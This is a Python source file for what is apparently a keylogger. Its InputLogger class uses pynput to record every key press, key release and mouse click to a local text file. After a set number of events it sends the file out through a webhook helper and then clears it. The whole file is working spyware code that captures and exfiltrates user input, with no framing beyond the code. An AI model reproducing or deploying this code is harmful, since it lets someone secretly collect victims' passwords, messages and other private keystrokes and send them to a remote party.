from pynput.keyboard import Listener as KeyboardListener, Key
from pynput.mouse import Listener as MouseListener, Button
import os

from config import MAX_INPUT_EVENTS_BEFORE_SEND
from utils.logging_utils import log_to_file, log_error, log_info
from utils.webhook_utils import send_log_file
from utils.file_utils import clear_log_file


class InputLogger:
    def __init__(self):
        self.log_file = "input.txt"
        self.counter_max = MAX_INPUT_EVENTS_BEFORE_SEND
        self.counter = 0
        self.running = True

    def log_keyboard_press(self, key):
        log_to_file(self.log_file, f"KEY PRESSED: {key}")
        self.increment_and_check_counter()

    def log_keyboard_release(self, key):
        log_to_file(self.log_file, f"KEY RELEASED: {key}")
        self.increment_and_check_counter()

    def log_mouse_click(self, x, y, button, pressed):
        action = "PRESSED" if pressed else "RELEASED"
        log_to_file(self.log_file, f"MOUSE {action} {str(button)} AT {x}, {y}")
        self.increment_and_check_counter()
        return self.running

    def log_input(self):
        with KeyboardListener(
            on_press=self.log_keyboard_press, on_release=self.log_keyboard_release
        ) as keyboard_listener, MouseListener(
            on_click=self.log_mouse_click
        ) as mouse_listener:
            keyboard_listener.join()
            mouse_listener.join()

    def increment_and_check_counter(self):
        self.counter += 1
        if self.counter > self.counter_max:
            send_log_file(f"SENDING LOG FILE: {self.log_file}", self.log_file)
            clear_log_file(self.log_file)
            log_info("Sent and cleared input log file.")
            self.counter = 0

    def run(self):
        try:
            self.log_input()
        except Exception as e:
            self.running = False
            log_error(e)
